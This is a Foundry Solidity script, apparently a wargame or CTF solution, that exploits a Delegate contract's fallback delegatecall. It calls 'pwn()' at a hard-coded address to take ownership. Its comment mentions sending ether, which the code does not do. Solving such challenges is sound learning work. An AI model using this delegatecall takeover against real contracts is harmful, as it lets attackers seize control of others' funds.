// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Delegate.sol";
import "forge-std/console.sol";

contract AttackScript is Script {
    function setUp() public {}


 //solveed by using the fallback and adding msg.data to the ether send call. 
  function run() public {
        vm.startBroadcast();

        Delegate delegateContract = Delegate(0x3D46E42dE1a9E264c9bdCeED9963390650347899);
        
        (bool success, ) = address(delegateContract).call(abi.encodeWithSignature("pwn()"));
        require(success, "Transfer failed.");

        vm.stopBroadcast();
    }
}
